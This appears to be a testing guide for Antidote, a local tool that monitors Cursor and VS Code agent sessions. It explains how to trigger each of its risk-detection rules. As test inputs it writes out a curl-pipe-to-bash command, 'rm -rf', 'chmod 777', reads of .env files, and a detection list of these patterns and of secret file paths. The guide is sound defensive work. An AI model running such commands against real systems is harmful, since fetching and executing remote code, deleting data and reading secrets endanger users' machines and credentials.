# Testing Vulnerable Cases

Instructions to manually trigger Antidote's risk detection (flags, NeedsReview, Risky). Ensure the daemon is running and the UI is open at `http://127.0.0.1:17845/ui/`.

---

## Terminal vs Cursor attribution

Antidote is designed to monitor **Cursor and VS Code** agent activity. Attribution works as follows:

| Context | Behavior |
|---------|----------|
| **Cursor/VS Code integrated terminal** | File writes are attributed to the Cursor session **if the path is under that session's roots** (workspace path when Cursor was opened, or roots added before Cursor started). |
| **External terminal** (Terminal.app, iTerm) | No Cursor session exists. File writes go to **"Background"** — unattributed activity. The UI now shows the Background session with its flags and risk. |
| **Watched root added after Cursor started** | Session roots are fixed at startup. Writes to newly added roots go to **Background** until you restart Cursor or open a project in that path. |

**Best practice for testing:** Open Cursor with a project whose path is your watched root (or contains it), add the root via API before opening, then run commands from Cursor's integrated terminal. Alternatively, use an external terminal — the **Background** session will show any detected flags.

---

## Prerequisites

1. **Start the daemon**: `cargo run -p antidote-daemon`
2. **Create the test directory and add a watched root** (path must exist):
   ```bash
   mkdir -p /tmp/antidote-vuln-test
   curl -X POST http://127.0.0.1:17845/roots -H "Content-Type: application/json" \
     -d '{"path":"/tmp/antidote-vuln-test"}'
   ```
3. **Verify the watcher is active**: `curl -s http://127.0.0.1:17845/debug/watchers | jq` should show your path. If empty, the root wasn't picked up (ensure path exists before adding).
4. **Optional:** Open Cursor with a project for per-session attribution. Without Cursor, activity appears under the **Background** session.

---

## 1. Sensitive file write (R1 – SENSITIVE_FILE_WRITE)

Triggers when writing to paths matching `**/.env`, `**/*.pem`, `~/.ssh/**`, etc.

```bash
TEST_ROOT="/tmp/antidote-vuln-test"  # or your watched root
mkdir -p "$TEST_ROOT"

# Create .env file (sensitive)
echo "AWS_SECRET_ACCESS_KEY=fake" > "$TEST_ROOT/.env"
echo "TOKEN=secret123" >> "$TEST_ROOT/.env"

# Or create a .pem file
touch "$TEST_ROOT/fake_key.pem"

# Or write to a path with "secrets" in the name
echo "data" > "$TEST_ROOT/config/secrets.json"
```

**Expected:** Session shows flag `R1` (ConfigTampering), Trust → NeedsReview or Risky.

**If FS events don't show up from terminal** (common on macOS with FSEvents and `/tmp` or "unowned" paths):
- **PollWatcher fallback:** Enable `file_events.use_poll_watcher: true` in config. PollWatcher scans periodically and reliably detects changes (tradeoff: slight performance cost).
- **debug/emit:** For quick testing without FS watcher, inject an event through the pipeline:
```bash
curl -X POST http://127.0.0.1:17845/debug/emit -H "Content-Type: application/json" \
  -d '{"session_id":"pending","event_type":"FILE_WRITE","payload":{"path":"/tmp/antidote-vuln-test/.env"}}'
```
Wait 2–3 seconds, refresh the Dashboard. The **Background** session should appear with R1/Risky.

---

## 2. Bulk delete (R3B – BULK_DELETE_PROGRESSIVE)

Triggers when 5+ files are deleted in a session (threshold in `rules.yaml`).

```bash
TEST_ROOT="/tmp/antidote-vuln-test"
mkdir -p "$TEST_ROOT/bulk"
for i in $(seq 1 10); do echo "x" > "$TEST_ROOT/bulk/f$i.txt"; done
rm -f "$TEST_ROOT/bulk/"*.txt
rmdir "$TEST_ROOT/bulk" 2>/dev/null || true
```

**Expected:** Flag `R3B` (DestructiveAction), bulk delete warning.

---

## 3. Unknown domain contact (R4 – UNKNOWN_DOMAIN_CONTACT)

Triggers when HTTP traffic goes to a domain not in `known_domains` (e.g. not api.openai.com, github.com, etc.).

**Option A – Proxy (recommended):** Set system proxy to `127.0.0.1:17846`, then:

```bash
curl https://unknown-example.com
curl https://suspicious-ml-server.example
```

**Option B – Debug emit** (event stored but may not trigger rules; rules run in pipeline):

```bash
SID=$(curl -s http://127.0.0.1:17845/sessions?limit=1 | jq -r '.[0].session_id // "enforcement"')
curl -X POST http://127.0.0.1:17845/debug/emit -H "Content-Type: application/json" \
  -d "{\"session_id\":\"$SID\",\"event_type\":\"NET_HTTP\",\"payload\":{\"domain\":\"unknown.example.com\",\"bytes_out\":5000000,\"bytes_in\":0}}"
```

**Expected:** Flag `R4` (UnknownEndpoint) when traffic goes through the proxy.

---

## 4. High egress (R5 – aggregate rule)

Triggers when session egress exceeds threshold (e.g. 10MB in `rules.yaml`).

```bash
# Route traffic through proxy, then download large file
curl -x http://127.0.0.1:17846 https://speed.hetzner.de/10MB.bin -o /dev/null
```

**Expected:** Flag related to high egress (e.g. R5, SuspiciousEgress) after crossing threshold.

---

## 5. Dangerous command (R3 – DANGEROUS_COMMAND)

Triggers on commands like `rm -rf`, `curl | sh`, `chmod 777`.

Requires **audit collector** (macOS, `sudo` privilege). Without audit, CmdExec events are not captured.

**If audit is set up:** Run in a terminal under the monitored workspace:

```bash
# Dangerous: recursive force delete
rm -rf /tmp/some_test_dir

# Dangerous: curl pipe to shell
curl -s https://example.com/script.sh | bash

# Dangerous: permissive chmod
chmod 777 /tmp/some_file
```

**Expected:** Flag `R3` (ExecutionRisk).

---

## 6. Sensitive file read (R14)

Triggers when reading sensitive paths (e.g. `.env`, `.pem`). Requires audit collector for FileRead events.

```bash
cat /path/to/watched/root/.env
```

---

## 7. Quick automated script

Use the existing `test.sh` to run several vulnerable cases:

```bash
export TEST_ROOT="/tmp/antidote-vuln-test"
./test.sh
```

This will:
- Add the watched root
- Wait for a Cursor session (or use latest)
- Create `.env`, bulk files, then bulk delete
- Optionally route proxy traffic
- Print session report and flags

---

## 8. Verify in UI

1. **Dashboard** – Sessions with flags should show Trust: NeedsReview or Risky.
2. **Session detail** – Open a session → “Top Findings” shows chips (e.g. ConfigTampering, DestructiveAction, UnknownEndpoint).
3. **Flags** – `GET /sessions/<id>/flags` or the Flags section in session detail.

---

## Summary of rule IDs

| Rule | Label / Trigger |
|------|------------------|
| R1 | Sensitive file write (.env, .pem, secrets, etc.) |
| R2 | Additional file-write checks |
| R3 | Dangerous command (rm -rf, curl\|sh, chmod 777) |
| R3B | Bulk delete (5+ files) |
| R4 | Unknown domain contact |
| R5–R12 | Aggregate rules (egress, counts, etc.) |
| R14 | Sensitive file read |

---

## Notes

- **FS events** require a watched root and the FS watcher; events must occur under that root.
- **Network events** require traffic through the proxy (`127.0.0.1:17846`).
- **Command events** require the audit collector (macOS, Phase 4).
- **Debug emit** writes events to the DB but does not run the rule pipeline; flags are created when events flow through the pipeline (FS watcher, proxy, audit).
